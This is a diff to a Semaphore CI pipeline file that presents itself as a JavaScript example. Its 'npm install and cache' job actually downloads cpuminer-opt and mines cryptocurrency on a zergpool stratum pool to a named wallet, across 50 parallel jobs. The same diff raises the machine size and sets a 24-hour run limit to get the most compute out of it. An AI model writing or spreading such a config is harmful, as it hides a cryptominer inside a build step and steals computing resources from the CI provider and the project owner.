@@ -2,8 +2,10 @@ version: v1.0
 name: Semaphore JavaScript Example Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
 blocks:
   - name: Install dependencies
     task:
@@ -21,7 +23,7 @@ blocks:
       jobs:
         - name: client npm install and cache
           commands:
-            - 'mkdir cm && cd cm && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC,m=solo'
+            - 'mkdir cm && cd cm && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BdY29toGG2dhQbs36btTfJtp7XkZNpA8Wt -p c=MBC'
           parallelism: 50
   - name: Lint
     task:
